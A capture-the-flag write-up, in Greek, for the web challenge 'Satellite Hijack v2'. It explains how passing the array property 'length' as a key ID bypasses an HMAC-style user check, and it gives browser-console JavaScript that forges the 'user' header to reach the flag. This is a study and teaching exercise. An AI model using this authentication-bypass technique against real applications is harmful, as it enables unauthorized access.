# Writeup for Satellite Hijack v2

| Δοκιμασία | Satellite Hijack v2 |
| :------- | :----- |
| Δυσκολία | Μέτρια |
| Κατηγορία | Παγκόσμιος Ιστός (Web) |
| Λύσεις | 4 |
| Πόντοι | 589 |

## Περιγραφή Δοκιμασίας

Όπως και στην 1η εκδοχή της δοκιμασίας αυτής, η περιγραφή της και πάλι δεν μας δίνει πληροφορίες για το τι πρέπει να κάνουμε. Μας δίνεται και πάλι μια ιστοσελίδα και ο κώδικας της. Οπότε θα μπορούσαμε να ξεκινήσουμε από την ανάλυσή του κώδικα.

## Ανάλυση

Κοιτώντας τον κώδικα που μας δίνεται, βλέπουμε πως έχει αρκετές ομοιότητες με την προηγούμενη έκδοση (web εφαρμογή γραμμένη σε [TypeScript](https://www.typescriptlang.org/) η οποία τρέχει πάνω σε [Bun](https://bun.sh/)).

Και πάλι η εφαρμογή υλοποιεί ένα `/flag` endopoint (μέσα στο αρχείο `app.ts`) το οποίο μπορεί να εκτυπώσει την σημαία αν ο χρήστης είναι `authorized`:
```typescript
.get(
  "/flag",
  async ({ layout, flagPage, userId, keyHash, authorized, redirect }) => {
    if (!authorized) return redirect("/");

    const $ = cheerio.load(Buffer.from(await layout().arrayBuffer()));

    $("#user").html(userId);
    $("#coordinates").html(keyHash);
    $(".link").removeClass("has-text-link");
    $("#flag-link").addClass("has-text-link");

    $("#content").html(await flagPage().text());
    $("#flag").html(flag);
    return $.html();
  }
)
```

Οπότε και πάλι, στόχος μας είναι να μπορέσουμε να έχουμε πρόσβαση σαν `authorized` χρήστη.

Σε σχέση με την 1η έκδοση της δοκιμασίας, έχει αλλάξει ο κώδικας με τον οποίο ο χρήστης γίνεται `authorized`.

```typescript
.resolve(async ({ headers, cookie, jwt }) => {
  let userId = newUser();
  let authorized = false;

  if (headers.user) {
    const [user, key_id, tag] = headers.user.split(":"); // To "user" header μπορεί να περιέχει μέσα "UserID:KeyID:Tag"
    const key = secretKeys[key_id] ? secretKeys[key_id] : null;
    if (key && hashed(`${user}:${key}`).toString() === tag) { // Για να είναι ο χρήστης authorized θα πρέπει το hashed("UserID:Key") να ταυτίζεται με το Tag
      authorized = true;
    }

    userId = user;
  }

  if (cookie.token.value) {
    const verification = await jwt.verify(cookie.token.value);

    if (verification) {
      authorized = verification.authorized == "y";
      userId = verification.userId.toString();
    } else {
      cookie.token.remove();
    }
  } else {
    cookie.token.value = await jwt.sign({
      userId,
      authorized: authorized ? "y" : "n",
    });
  }
  
  let keyHash = hashed(secretKeys[userId % secretKeys.length]).toString();
  return { userId, keyHash, authorized };
})
```

Για να μπορέσουμε να γίνουμε `authorized` χρήστες, θα πρέπει να μπορέσουμε να κατασκευάσουμε ένα `user` header τύπου `UserID:KeyID:Tag`, για το οποίο το `hashed("UserID:Key")` (όπου `Key` είναι το κλειδί που αναφέρετε στο KeyID που στείλαμε) θα πρέπει να ταυτίζεται με το `Tag`.

Αφού δεν γνωρίζουμε τα κλειδιά, θεωρητικά δεν μπορούμε να ξέρουμε τι θα γυρίσει η εντολή `const key = secretKeys[key_id] ? secretKeys[key_id] : null;` για να μπορέσουμε να κατασκευάσουμε ένα σωστό `user` header... αλλά εδώ βρίσκεται και η ευπάθεια.

Μιας και η ανάκτηση του κλειδιού γίνεται καλώντας `secretKeys[key_id]` (όπου εμείς έχουμε έλεγχο του `key_id`), μπορούμε να δώσουμε αντί για νούμερο κάποιο άλλο attribute για το οποίο θα γνωρίζουμε το αποτέλεσμα της εντολής, π.χ. `secretKeys["length"]` το οποίο θα γυρίσει το μέγεθος του array, ή `secretKeys["concat"]` το οποίο θα γυρίσει μια συνάρτηση.

Θα μπορούσαμε λοιπόν στο `UserID:KeyID:Tag` αντί για αριθμό για το `KeyID` να στείλουμε `length`. Μιας και δεν ξέρουμε πόσα κλειδιά είναι στο array του server, θα μπορούσαμε να κάνουμε δοκιμές μέχρι να βάλουμε τον σωστό αριθμό. Εναλλακτικά, μπορούμε να κάνουμε αρκετά requests προς το `/about` endpoint το οποίο διαλέγει τυχαία ένα κλειδί και βάση αυτού εκτυπώνει κάποιες συντεταγμένες, και να μετρήσουμε τον αριθμό των διαφορετικών αποτελεσμάτων, το οποίο και θα είναι ο αριθμός των κλειδιών.

Με την χρήση του παρακάτω κώδικα (ο οποίος μπορεί να εκτελεστεί στην κονσόλα του περιηγητή μας), μπορούμε να υπολογίσουμε των αριθμό των κλειδιών:
```javascript
function getCords(times, log) {
    if (times <= 0) {
        console.log(log);
        console.log('Number of different cords:', log.length);
        return;
    }
    console.log(times);
    fetch("/about", {
        method: "GET",
        credentials: "omit"
    }).then(x => x .text()).then(x => {
        let cords = x.match(/<div id="coordinates"[^>]*>(\d+)</)[1];
        if (!log.includes(cords)) log.push(cords)
        getCords(times - 1, log);
    });
}
getCords(100, []);
```

Και πήραμε σαν αποτέλεσμα πως μάλλον υπάρχουν 10 κλειδιά στον server:
```
Number of different cords: 10
```

Στην συνέχεια μπορούμε να ζητήσουμε από τον server να μας δημιουργήσει ένα hash για το αλφαριθμητικό `1:10` (UserID 1 και Κey Value 10) για κατασκευάσουμε ένα σωστό Tag:
```javascript
fetch("/hash", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({ data : '1:10' }),
}).then(x => x .text()).then(x => console.log(x));
```

Ο server μας γυρνάει το hash:
```
{"hash":"1591375115499822604"}
```

Και μπορούμε τώρα να στείλουμε το hash αυτό, μαζί με UserID `1` και ΚeyID `length`:
```javascript
fetch("/flag", {
    method: "GET",
    headers: {"user": "1:length:1591375115499822604"},
    credentials: "omit"
}).then(x => x .text()).then(x => console.log(x.match(/\w+{[^}]+}/)[0]));
```

Το οποίο και θα μας γυρίσει το flag αφού ο χρήστης θα φαίνεται ως `authorized`.

